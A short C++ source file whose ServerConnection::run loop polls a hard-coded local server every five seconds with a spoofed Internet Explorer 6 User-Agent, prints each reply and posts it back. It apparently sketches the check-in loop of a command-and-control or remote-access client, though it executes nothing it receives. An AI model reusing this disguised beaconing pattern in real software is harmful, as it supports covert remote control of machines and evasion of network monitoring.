#include "ServerConnection.h"

std::string ServerConnection::_serverAddress = "http://192.168.1.130";

ConnectionHandler* ServerConnection::run(void)
{
    try
    {
        while (true)
        {
            http::Request request(ServerConnection::_serverAddress);
            http::Response response = request.send("GET", "", { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" });
            std::cout << std::string(response.body.begin(), response.body.end()) << std::endl;
            response = request.send("POST", std::string(response.body.begin(), response.body.end()), { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" });
            Sleep(5000);
        }
    }
    catch (...)
    {
        Log::log("Conection with Server Failed.");
        return nullptr;
    }
}
